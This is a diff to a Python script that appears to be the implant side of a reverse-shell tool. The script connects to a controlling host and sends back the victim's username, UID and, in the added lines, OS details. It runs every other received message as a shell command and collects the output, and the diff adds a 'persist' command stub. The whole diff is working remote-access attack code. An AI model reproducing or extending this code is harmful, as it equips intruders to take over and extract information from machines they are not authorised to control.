@@ -3,6 +3,8 @@ import subprocess
 import os
 import sys
 import pwd
+import platform
+import time
 
 def inbound():
     print("[+] Awaiting response...")
@@ -25,6 +27,10 @@ def session_handler():
     sock.connect((host_ip, host_port))
     outbound(pwd.getpwuid(os.getuid())[0])
     outbound(os.getuid())
+    time.sleep(1)
+    op_sys = platform.uname()
+    op_sys = (f'{op_sys[0]} {op_sys[2]}')
+    outbound(op_sys)
     print(f"[+] Connected to {host_ip}.")
 
     while True:
@@ -51,6 +57,9 @@ def session_handler():
         elif message == "background":
             pass
 
+        elif message == "persist":
+            pass
+        
         else:
             command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             output = command.stdout.read() + command.stderr.read()
